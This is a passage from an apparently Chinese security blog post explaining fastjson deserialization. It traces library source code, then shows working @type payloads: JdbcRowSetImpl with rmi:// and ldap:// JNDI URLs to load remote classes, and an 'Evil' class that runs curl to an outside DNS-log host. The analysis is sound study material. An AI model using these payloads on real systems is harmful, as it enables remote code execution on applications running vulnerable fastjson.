</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;---&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* parse会转换为@type指定的类 */</span>
</span></span><span class="line"><span class="cl">        <span class="n">Object</span> <span class="n">parse1</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">json2</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;parse1 &#34;</span> <span class="o">+</span> <span class="n">parse1</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">parse1</span><span class="o">.</span><span class="na">getClass</span><span class="o">());</span><span class="c1">// class learn.User
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;---&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* parseObject会转换为JSONObject类 */</span>
</span></span><span class="line"><span class="cl">        <span class="n">Object</span> <span class="n">parse2</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">json2</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;parse2 &#34;</span> <span class="o">+</span> <span class="n">parse2</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">parse2</span><span class="o">.</span><span class="na">getClass</span><span class="o">());</span><span class="c1">// class com.alibaba.fastjson.JSONObject
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;---&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* parseObject中指定类参数则会转换为其指定的类 */</span>
</span></span><span class="line"><span class="cl">        <span class="n">User</span> <span class="n">parse3</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">json2</span><span class="o">,</span> <span class="n">User</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;parse3 &#34;</span> <span class="o">+</span> <span class="n">parse3</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">parse3</span><span class="o">.</span><span class="na">getClass</span><span class="o">());</span><span class="c1">// class learn.User
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;---&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/71ef9f876b25fc7587282cf25039526d.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/71ef9f876b25fc7587282cf25039526d.png, https://img.mi3aka.eu.org/2023/02/71ef9f876b25fc7587282cf25039526d.png 1.5x, https://img.mi3aka.eu.org/2023/02/71ef9f876b25fc7587282cf25039526d.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/71ef9f876b25fc7587282cf25039526d.png"
        title="https://img.mi3aka.eu.org/2023/02/71ef9f876b25fc7587282cf25039526d.png" /></p>
<h3 id="getproperties被调用的原因">getProperties被调用的原因</h3>
<p>三个getter方法,只有getProperties被调用</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//com.alibaba.fastjson.util.JavaBeanInfo
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="o">(</span><span class="n">Method</span> <span class="n">method</span> <span class="o">:</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getMethods</span><span class="o">())</span> <span class="o">{</span> <span class="c1">// getter methods
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="cm">/* 通过getMethods获取所有公共方法,然后通过循环判断这些方法是否可以加入fieldList中 */</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">methodName</span> <span class="o">=</span> <span class="n">method</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">methodName</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="o">)</span> <span class="o">{</span><span class="c1">// 方法名长度大于4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">Modifier</span><span class="o">.</span><span class="na">isStatic</span><span class="o">(</span><span class="n">method</span><span class="o">.</span><span class="na">getModifiers</span><span class="o">()))</span> <span class="o">{</span><span class="c1">// 方法不是静态方法
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">methodName</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;get&#34;</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">Character</span><span class="o">.</span><span class="na">isUpperCase</span><span class="o">(</span><span class="n">methodName</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">3</span><span class="o">)))</span> <span class="o">{</span><span class="c1">// 方法名必须以get开头,然后getXxx必须首字母大写
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="o">...</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">Collection</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">method</span><span class="o">.</span><span class="na">getReturnType</span><span class="o">())</span> <span class="o">||</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">method</span><span class="o">.</span><span class="na">getReturnType</span><span class="o">())</span> <span class="o">||</span> <span class="n">AtomicBoolean</span><span class="o">.</span><span class="na">class</span> <span class="o">==</span> <span class="n">method</span><span class="o">.</span><span class="na">getReturnType</span><span class="o">()</span> <span class="o">||</span> <span class="n">AtomicInteger</span><span class="o">.</span><span class="na">class</span> <span class="o">==</span> <span class="n">method</span><span class="o">.</span><span class="na">getReturnType</span><span class="o">()</span> <span class="o">||</span> <span class="n">AtomicLong</span><span class="o">.</span><span class="na">class</span> <span class="o">==</span> <span class="n">method</span><span class="o">.</span><span class="na">getReturnType</span><span class="o">())</span> <span class="o">{</span> <span class="c1">//判断接口是否相同
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">String</span> <span class="n">propertyName</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="n">JSONField</span> <span class="n">annotation</span> <span class="o">=</span> <span class="n">method</span><span class="o">.</span><span class="na">getAnnotation</span><span class="o">(</span><span class="n">JSONField</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">annotation</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">annotation</span><span class="o">.</span><span class="na">deserialize</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">annotation</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">annotation</span><span class="o">.</span><span class="na">name</span><span class="o">().</span><span class="na">length</span><span class="o">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">propertyName</span> <span class="o">=</span> <span class="n">annotation</span><span class="o">.</span><span class="na">name</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">propertyName</span> <span class="o">=</span> <span class="n">Character</span><span class="o">.</span><span class="na">toLowerCase</span><span class="o">(</span><span class="n">methodName</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">3</span><span class="o">))</span> <span class="o">+</span> <span class="n">methodName</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">4</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">                    methodName = getAge
</span></span></span><span class="line"><span class="cl"><span class="cm">                    propertyName = age
</span></span></span><span class="line"><span class="cl"><span class="cm">                */</span>
</span></span><span class="line"><span class="cl">                <span class="n">FieldInfo</span> <span class="n">fieldInfo</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">fieldList</span><span class="o">,</span> <span class="n">propertyName</span><span class="o">);</span><span class="c1">//判断propertyName是否存在于fieldList中,即判断是否存在setAge方法
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">if</span> <span class="o">(</span><span class="n">fieldInfo</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span><span class="c1">//没有setAge方法则添加到fieldList中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="n">add</span><span class="o">(</span><span class="n">fieldList</span><span class="o">,</span> <span class="k">new</span> <span class="n">FieldInfo</span><span class="o">(</span><span class="n">propertyName</span><span class="o">,</span> <span class="n">method</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">clazz</span><span class="o">,</span> <span class="n">type</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">annotation</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="parseobjectjson调用所有setter和getter的原因">parseObject(json)调用所有setter和getter的原因</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//com.alibaba.fastjson.JSON
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">JSONObject</span> <span class="nf">parseObject</span><span class="o">(</span><span class="n">String</span> <span class="n">text</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">parse</span><span class="o">(</span><span class="n">text</span><span class="o">);</span><span class="c1">//JSON.parse(json)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">obj</span> <span class="k">instanceof</span> <span class="n">JSONObject</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="o">(</span><span class="n">JSONObject</span><span class="o">)</span> <span class="n">obj</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">(</span><span class="n">JSONObject</span><span class="o">)</span> <span class="n">JSON</span><span class="o">.</span><span class="na">toJSON</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span><span class="c1">//主要原因在于对解析出的json对象进行了一次toJSON操作
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">toJSON</span><span class="o">(</span><span class="n">Object</span> <span class="n">javaObject</span><span class="o">,</span> <span class="n">SerializeConfig</span> <span class="n">config</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">serializer</span> <span class="k">instanceof</span> <span class="n">JavaBeanSerializer</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">JavaBeanSerializer</span> <span class="n">javaBeanSerializer</span> <span class="o">=</span> <span class="o">(</span><span class="n">JavaBeanSerializer</span><span class="o">)</span> <span class="n">serializer</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">JSONObject</span> <span class="n">json</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JSONObject</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">values</span> <span class="o">=</span> <span class="n">javaBeanSerializer</span><span class="o">.</span><span class="na">getFieldValuesMap</span><span class="o">(</span><span class="n">javaObject</span><span class="o">);</span><span class="c1">//对json中的getter进行遍历
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="o">...</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">json</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/48ee5205ab58ac48781ff3e0d0094773.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/48ee5205ab58ac48781ff3e0d0094773.png, https://img.mi3aka.eu.org/2023/02/48ee5205ab58ac48781ff3e0d0094773.png 1.5x, https://img.mi3aka.eu.org/2023/02/48ee5205ab58ac48781ff3e0d0094773.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/48ee5205ab58ac48781ff3e0d0094773.png"
        title="https://img.mi3aka.eu.org/2023/02/48ee5205ab58ac48781ff3e0d0094773.png" /></p>
<p><code>sortedGetters</code>保存了所有getter的名称</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//com.alibaba.fastjson.serializer.JavaBeanSerializer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="nf">getFieldValuesMap</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">LinkedHashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;(</span><span class="n">sortedGetters</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="o">(</span><span class="n">FieldSerializer</span> <span class="n">getter</span> <span class="o">:</span> <span class="n">sortedGetters</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">getter</span><span class="o">.</span><span class="na">fieldInfo</span><span class="o">.</span><span class="na">name</span><span class="o">,</span> <span class="n">getter</span><span class="o">.</span><span class="na">getPropertyValue</span><span class="o">(</span><span class="n">object</span><span class="o">));</span><span class="c1">//进入get方法
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">map</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//com.alibaba.fastjson.serializer.FieldSerializer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getPropertyValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">InvocationTargetException</span><span class="o">,</span> <span class="n">IllegalAccessException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Object</span> <span class="n">propertyValue</span> <span class="o">=</span>  <span class="n">fieldInfo</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">object</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//com.alibaba.fastjson.util.FieldInfo
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">get</span><span class="o">(</span><span class="n">Object</span> <span class="n">javaObject</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IllegalAccessException</span><span class="o">,</span> <span class="n">InvocationTargetException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">method</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">method</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">javaObject</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span><span class="c1">//通过反射进行调用
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">return</span> <span class="n">value</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">field</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">javaObject</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="调用恶意类">调用恶意类</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/* fastjson支持使用@type来指定反序列化的目标类,@type指向一个恶意类,触发恶意代码 */</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">json1</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;learn.Evil\&#34;,\&#34;age\&#34;:15,\&#34;name\&#34;:\&#34;Jame\&#34;}&#34;</span><span class="o">;</span><span class="c1">// dnslog
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">json1</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;---&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* 
</span></span></span><span class="line"><span class="cl"><span class="cm">         * rmi加载恶意类,使用jdk8u102进行复现
</span></span></span><span class="line"><span class="cl"><span class="cm">         * jdk8u113后,属性com.sun.jndi.rmi.object.trustURLCodebase和com.sun.jndi.cosnaming.object.trustURLCodebase的默认值变为false
</span></span></span><span class="line"><span class="cl"><span class="cm">         * 即默认不允许RMI,cosnaming从远程的Codebase加载Reference工厂类
</span></span></span><span class="line"><span class="cl"><span class="cm">         */</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">json2</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;:\&#34;rmi://127.0.0.1:1099/exp\&#34;, \&#34;autoCommit\&#34;:true}&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">json2</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;---&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">         * ldap加载恶意类,同样使用jdk8u102进行复现
</span></span></span><span class="line"><span class="cl"><span class="cm">         * jdk8u191后,属性com.sun.jndi.ldap.object.trustURLCodebase的默认值变为false
</span></span></span><span class="line"><span class="cl"><span class="cm">         */</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">json3</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;:\&#34;ldap://10.10.10.3:1389/exp\&#34;, \&#34;autoCommit\&#34;:true}&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">json3</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;---&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ol>
<li>本地恶意类</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Evil</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">Evil</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Evil Construct&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;curl http://evil.c3d8e837.dns.1433.eu.org&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/30a98e3898507c4db00cc78dbf1d27c4.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/30a98e3898507c4db00cc78dbf1d27c4.png, https://img.mi3aka.eu.org/2023/02/30a98e3898507c4db00cc78dbf1d27c4.png 1.5x, https://img.mi3aka.eu.org/2023/02/30a98e3898507c4db00cc78dbf1d27c4.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/30a98e3898507c4db00cc78dbf1d27c4.png"
        title="https://img.mi3aka.eu.org/2023/02/30a98e3898507c4db00cc78dbf1d27c4.png" /></p>
<ol start="2">
<li>RMI调用</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
